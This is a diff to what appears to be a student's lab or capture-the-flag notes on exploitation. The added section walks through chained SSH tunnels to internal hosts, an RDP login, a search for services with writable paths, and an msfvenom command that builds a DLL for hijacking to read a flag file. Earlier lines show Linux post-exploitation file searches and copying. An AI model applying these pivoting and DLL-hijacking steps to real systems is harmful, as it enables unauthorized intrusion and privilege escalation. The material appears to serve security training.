@@ -153,12 +153,23 @@ ON MACHINE BEING EXPLOITED
       cat nmapkey.txt
 12. scp -P 3003 www-data@localhost:/home/comrade/Dekstop/network/map.png
 13. find / -name *inventory* 2>/dev/null
-14.
-15
 
 
-
-
+#########################
+  WINDOWS EXPLOITATION 
+#########################
+1. ssh student@10.50.39.165 -L 3001:localhost:22 -NT
+2. ssh -p 3001 student@localhost -L 3005:192.168.28.105:2222 -NT
+3. ssh -p 3005 comrade@localhost -L 3006:192.168.28.5:3389 -NT
+4. xfreerdp /u:comrade /v:localhost:3006 +glyph-cache +clipboard +dynamic-resolution
+5. Go to c:\users\comrade and open the security log file
+      look for all events triggered on 05-31 between 1200 and 1330. Looking inside the details page on the lower tab identify Fortnite
+6. net use * http://live.sysinternals.com
+      Z:
+7. go to services and look for a service without a description
+8. go to file path and check to see if you can write and delete files
+9. check configuration file and look for .dll
+10. msfvenom -p windows/exec CMD='cmd.exe /C cat C:\Users\Admin\Desktop\flag.txt > C:\\flag.txt' -f dll > hijackmeplz.dll
 
      
 
